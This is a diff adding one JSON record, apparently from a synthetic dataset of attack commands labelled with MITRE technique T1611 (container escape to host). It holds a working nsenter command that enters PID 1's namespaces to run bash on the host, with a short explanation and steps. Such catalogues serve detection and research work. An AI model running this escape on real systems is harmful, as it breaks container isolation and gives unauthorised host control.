@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-227ea404-bdf47f35",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "nsenter --target 1 --mount --uts --net --pid -- bash",
+  "explanation": "Enters the namespaces of the host's init process (PID 1) to execute bash, gaining host-level command execution.",
+  "rationale_steps": [
+    "Select target process with host scope (PID 1).",
+    "Enter relevant namespaces to execute commands as if on the host."
+  ],
+  "source_prompt_hash": "227ea404",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:30:03.527255Z"
+}
